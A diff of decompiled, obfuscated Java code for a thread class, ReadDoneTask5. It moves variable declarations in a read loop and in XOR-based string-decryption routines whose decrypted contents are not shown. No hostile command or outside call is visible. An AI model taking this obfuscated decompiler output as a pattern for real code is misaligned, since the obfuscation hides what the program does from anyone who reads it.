@@ -19,6 +19,7 @@ public class ReadDoneTask5 extends Thread {
    // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
    @Override
    public void run() {
+      IOException var8;
       String[] var10000 = DnsResolveFailedSetting.I$arrString();
       byte[] var2 = new byte[a(315, 6785777988244070746L)];
       String[] var1 = var10000;
@@ -36,7 +37,6 @@ public class ReadDoneTask5 extends Thread {
                      break label26;
                   }
                } catch (IOException var7) {
-      byte[] var8;
                   var8 = var7;
                   boolean var10001 = false;
                   break label27;
@@ -53,7 +53,6 @@ public class ReadDoneTask5 extends Thread {
                Connection3.s += var4;
                continue;
             } catch (IOException var6) {
-      int var8;
                var8 = var6;
                boolean var9 = false;
             }
@@ -72,6 +71,7 @@ public class ReadDoneTask5 extends Thread {
    }
 
    public static String a(int var0, int var1) {
+      int var8;
       int var2 = (var0 ^ 17666) & 65535;
       if (b[var2] == null) {
          char[] var3 = a[var2].toCharArray();
@@ -858,7 +858,7 @@ public class ReadDoneTask5 extends Thread {
          }
 
          for (int var7 = 0; var7 < var3.length; var7++) {
-            int var8 = var7 % 2;
+            var8 = var7 % 2;
             char var10002 = var3[var7];
             if (var8 == 0) {
                var3[var7] = (char)(var10002 ^ var5);
@@ -886,6 +886,7 @@ public class ReadDoneTask5 extends Thread {
 
    // $VF: Irreducible bytecode was duplicated to produce valid code
    public static void __vfClinit__() {
+      char[] var30;
       String[] var13 = new String[4];
       int var11 = 0;
       String var10 = "讃卭g\u0004Â°æ\u001b";
@@ -900,7 +901,6 @@ public class ReadDoneTask5 extends Thread {
          byte var10002 = -1;
 
          while (true) {
-      char[] var30;
             label56: {
                char[] var34 = var10001.toCharArray();
                int var10004 = var34.length;
